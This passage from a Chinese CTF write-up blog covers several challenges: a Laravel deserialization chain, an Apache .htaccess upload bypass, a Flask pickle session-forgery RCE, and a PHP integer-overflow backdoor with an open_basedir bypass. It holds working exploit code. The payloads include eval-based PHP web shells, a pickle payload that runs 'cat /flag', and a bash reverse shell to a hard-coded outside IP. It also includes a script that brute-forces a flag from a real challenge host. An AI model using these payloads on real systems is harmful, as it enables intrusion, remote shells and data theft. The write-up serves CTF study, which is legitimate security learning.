urlencode(serialize($pencom));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>5.7 师傅们说的是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$command, $parameters,$class,$app</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $attributes</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$bind</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">genericuser</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>(</span><br><span class="line">        <span class="title">array</span>(</span><br><span class="line">            &quot;<span class="title">expectedOutput</span>&quot;=&gt;<span class="title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),</span><br><span class="line">            &quot;<span class="title">expectedQuestions</span>&quot;=&gt;<span class="title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;</span><br><span class="line">                <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;concrete&quot;</span>=&gt;<span class="string">&quot;Illuminate\Foundation\Application&quot;</span></span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>),</span><br><span class="line">        $genericuser,</span><br><span class="line">        $application</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>哎哟真透了NM。有得重新来了</p>
<h1 id="正确的链子"><a href="#正确的链子" class="headerlink" title="正确的链子"></a>正确的链子</h1><p><img src="image-20210511201751743.png" alt="image-20210511201751743"></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>uploadlabs</title>
    <url>/2021/05/11/%E6%B4%A5%E9%97%A8%E6%9D%AFuploadlabs/</url>
    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>apache文件配置</p>
<h1 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h1><p>这道题目放出了源码，通过源码的配置我们是可以看见的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/&gt;</span></span><br><span class="line">	Options  Indexes FollowSymLinks</span><br><span class="line">	AllowOverride All </span><br><span class="line">	Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> ~ &quot;/<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">html</span>/<span class="attr">upload</span>/[<span class="attr">a-f0-9</span>]&#123;<span class="attr">32</span>&#125;/&quot;&gt;</span></span><br><span class="line">        php_flag engine off</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>自己做题的时候因为没有接触过类似的题目，，apahce的文件配置，所以做题的时候一直上传.htaccess修改为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> ~ &quot;/<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">html</span>/<span class="attr">upload</span>/[<span class="attr">a-f0-9</span>]&#123;<span class="attr">32</span>&#125;/&quot;&gt;</span></span><br><span class="line">        php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果还是没用【】</p>
<h1 id="官方WP："><a href="#官方WP：" class="headerlink" title="官方WP："></a>官方WP：</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> <span class="attr">.htaccess</span>&gt;</span></span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#<span class="tag">&lt;<span class="name">?php</span> <span class="attr">eval</span>($<span class="attr">_REQUEST</span>[<span class="attr">0</span>])?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是官方对于具体原理并没有做出解释，尝试去看看apache的配置解说</p>
<p><img src="uploadlabs/image-20210511103047201.png" alt="image-20210511103047201"></p>
<p>上面一段的php文件也就说明我们的每个文件都会被当作PHP来解析，并且会被加入一句话木马</p>
<p><img src="uploadlabs/image-20210511103945580.png" alt="image-20210511103945580"></p>
<h1 id="HA1C9ON师傅的"><a href="#HA1C9ON师傅的" class="headerlink" title="HA1C9ON师傅的"></a>HA1C9ON师傅的</h1><p>其实apahce的官方文档中有这么一句话：</p>
<p><img src="uploadlabs/image-20210511104126805.png" alt="image-20210511104126805"></p>
<p>这段的意思是告诉我们files标签的优先级要更高，故我们可以通过:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> &#x27;<span class="attr">1.php</span>&#x27;&gt;</span></span><br><span class="line">	php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再上传一个1.php即可</p>
<p><img src="uploadlabs/image-20210511104548814.png" alt="image-20210511104548814"></p>
<p>var_dump(file_get_contents(‘/flag’));</p>
<h1 id="Nu1L"><a href="#Nu1L" class="headerlink" title="Nu1L"></a>Nu1L</h1><p>这个思路实在是太骚了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">ip = requests.get(<span class="string">&#x27;http://118.24.185.108/ip.php&#x27;</span>).text</span><br><span class="line">print(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">a</span>):</span></span><br><span class="line">    f = <span class="string">&#x27;&#x27;&#x27;&lt;If &quot;file(&#x27;/flag&#x27;)=~ /&#x27;&#x27;&#x27;</span>+a+<span class="string">&#x27;&#x27;&#x27;/&quot;&gt;</span></span><br><span class="line"><span class="string">    ErrorDocument 404 &quot;wupco&quot;</span></span><br><span class="line"><span class="string">    &lt;/If&gt;</span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span></span><br><span class="line">    print(f)</span><br><span class="line">    resp = requests.post(<span class="string">&quot;http://122.112.248.222:20003/index.php?id=167&quot;</span>,data=&#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>,f)&#125; )</span><br><span class="line">    a = requests.get(<span class="string">&quot;http://122.112.248.222:20003/upload/&quot;</span>+ip+<span class="string">&quot;/a&quot;</span>).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;wupco&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">c = string.ascii_letters + string.digits + <span class="string">&quot;\&#123;\&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;checking: &quot;</span>+ flag+i)</span><br><span class="line">        <span class="keyword">if</span> check(flag+i):</span><br><span class="line">            flag = flag+i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>通过修改apahce的404显示页面，注入得到flag。</p>
<p>自己想到的一个思路，但是不知道为什么无论如何都是500.</p>
<p>根据别人的说法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;mejinke&#x2F;blog&#x2F;49450</span><br></pre></td></tr></table></figure>

<p>修改apache2的配置的话是可以使得HTML包含其他页面的，但是一直会失败，不知道有师傅是否能够成功</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /&gt;</span></span><br><span class="line">   Options FollowSymLinks</span><br><span class="line">   AllowOverride None</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">D:</span>/<span class="attr">www</span>&gt;</span></span><br><span class="line">   AddType text/html .shtml .html .htm</span><br><span class="line">   AddOutputFilter INCLUDES .shtml .html .htm</span><br><span class="line">   Options Indexes FollowSymLinks MultiViews Includes ExecCGI</span><br><span class="line">   AllowOverride All</span><br><span class="line">   Order allow,deny</span><br><span class="line">   allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h1 id="hate-PHP"><a href="#hate-PHP" class="headerlink" title="hate_PHP"></a>hate_PHP</h1><p>这个题目就是安恒月赛- -</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30387423&#x2F;article&#x2F;details&#x2F;99558868</span><br></pre></td></tr></table></figure>



<p>知识点：</p>
<p>/bin/cat 就是cat命令，所以我们可以</p>
<p>这样就读取到flag了= =</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/??? /????`;?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>虎符FINALeasyflasku&#39;x</title>
    <url>/2021/05/12/%E8%99%8E%E7%AC%A6FINALeasyflask/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>Python的反序列化</p>
<p>Flask session伪造</p>
<h1 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h1><p>题目是可以拿到源码的，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看见有key直接读取/proc/self/environ 就能读到了</p>
<p>看见pick就知道是Python的反序列化了 = =</p>
<p>关于Python的反序列化我之前已经写过了</p>
<p>所以这里直接造它就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    uname = <span class="string">&#x27;ys&#x27;</span></span><br><span class="line">    is_admin = <span class="number">1</span></span><br><span class="line">    __repr__ = <span class="keyword">lambda</span> o: o.uname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>  (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /123&#x27;)&quot;</span>,))</span><br></pre></td></tr></table></figure>

<p>或者你这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;tyskill&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system, (<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.68.201.65/8001 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>都可以造出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">u = pickle.dumps(User())</span><br><span class="line">print(b64encode(u).decode())</span><br></pre></td></tr></table></figure>

<p>之后session伪造用github的工具：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;noraj&#x2F;flask-session-cookie-manager</span><br></pre></td></tr></table></figure>



<p>生成:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> -t <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC8xMjMnKZSFlFKULg==&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>拿过去打</p>
<h1 id="踩坑："><a href="#踩坑：" class="headerlink" title="踩坑："></a>踩坑：</h1><h2 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h2><p>首先加密是生成了一串base64的值，你要伪造session的话必须使用字典的方式，所以通过捏一个假字典的方式来生成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;u&#x27;</span>:&#123;<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;base64的值&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-环境问题"><a href="#2-环境问题" class="headerlink" title="2.环境问题"></a>2.环境问题</h2><p>靶机是Linux环境，本地是Windows环境，这两个环境下dumps的结果中序列化字符串声明系统的标识符不同：Linux=&gt;posix；Windows=&gt;nt，需要将脚本放在Linux环境下生成序列化字符串。</p>
<h2 id="3-BUU好像弹不出来shell"><a href="#3-BUU好像弹不出来shell" class="headerlink" title="3.BUU好像弹不出来shell"></a>3.BUU好像弹不出来shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># User = type(&#x27;User&#x27;, (object,), &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;uname&#x27;: &#x27;tyskill&#x27;,</span></span><br><span class="line"><span class="comment">#     &#x27;is_admin&#x27;: 1,</span></span><br><span class="line"><span class="comment">#     &#x27;__repr__&#x27;: lambda o: o.uname,</span></span><br><span class="line"><span class="comment">#     &#x27;__reduce__&#x27;: lambda o: (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.68.201.65/8001 0&gt;&amp;1&#x27;&quot;,))</span></span><br><span class="line"><span class="comment"># &#125;)</span></span><br></pre></td></tr></table></figure>

<p>无论是自己捏的还是网上找的，都捏不出来- -</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>OnePointerPHP</title>
    <url>/2021/05/12/OnePointerPHP/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">    $count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">        $user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">        setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $user=<span class="keyword">new</span> User;</span><br><span class="line">    $user-&gt;count=<span class="number">1</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>PHP的整数型是有上限的，根据大佬的博客：</p>
<p>在 PHP 中，整型数是有一个范围的，对于32位的操作系统，最大的整型是2147483647，即2的31次方，最小为-2的31次方。如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。</p>
<p>我们来复现一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">123445566</span>;</span><br><span class="line">$b = <span class="number">9223372036854775807</span>;</span><br><span class="line">$c = <span class="number">9223372036854775808</span>;</span><br><span class="line">$d = <span class="number">50000000000000</span> * <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">var_dump($c);</span><br><span class="line">var_dump($d);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们不难发现跳转从5807-&gt;5808的时候变成了double类型。</p>
<p><img src="OnePointerPHP/image-20210512161147845.png" alt="image-20210512161147845"></p>
<p>这也就说明当超过的时候会存在一次隐形的数据转换，而数组在创建的时候已经将内存定下来了（盲猜）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userconut = <span class="number">9223372036854775806</span>;</span><br><span class="line">$count[++$userconut] = <span class="number">1</span>;</span><br><span class="line">$count[] = <span class="number">1</span>;</span><br><span class="line">print_r($count);</span><br></pre></td></tr></table></figure>

<p>所以这段时间会报错，利用这个绕过报错。</p>
<p>写入文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;%3fphp+eval(\$_POST[1])%3b%3f&gt;&quot;</span>)%<span class="number">3</span>b</span><br></pre></td></tr></table></figure>

<p>用蚁剑🔗上去，发现被basedir 限制了，绕过的话需要：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents($_GET[<span class="string">&#x27;file&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>文章解释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;LLeaves&#x2F;p&#x2F;13210005.html</span><br></pre></td></tr></table></figure>

<p>为了图方便我直接写在了1.php里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mayi077.gitee.io&#x2F;2021&#x2F;05&#x2F;04&#x2F;%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents($_GET[<span class="string">&#x27;file&#x27;</span>]));</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<h1 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h1><p><img src="OnePointerPHP/image-20210512173802306.png" alt="image-20210512173802306"></p>
<h1 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h1><p>这时候想要读flag结果发现无法读取。回到phpinfo当中，我们发现我们是有fpm的。</p>
<p><img src="OnePointerPHP/image-20210512171824810.png" alt="image-20210512171824810"></p>
<p>而php是可以用这个进行提权的。接下来我们需要找fpm的配置文件</p>
<p>读取文件 /proc/self/cmdline</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;91eedfff-1313-4748-954f-100343ceda6d.node3.buuoj.cn&#x2F;2.php?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline</span><br></pre></td></tr></table></figure>

<p>没有得到我们需要的东西0 0</p>
<p>而self的意义是：</p>
<p>我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p>
<p>但是很显然的启动FPM服务不是本进程，我们用burp爆破一下进程</p>
<p><img src="OnePointerPHP/image-20210512172438615.png" alt="image-20210512172438615"></p>
<p>得到37，我们再去读取该文件来找到fpm的开放端口</p>
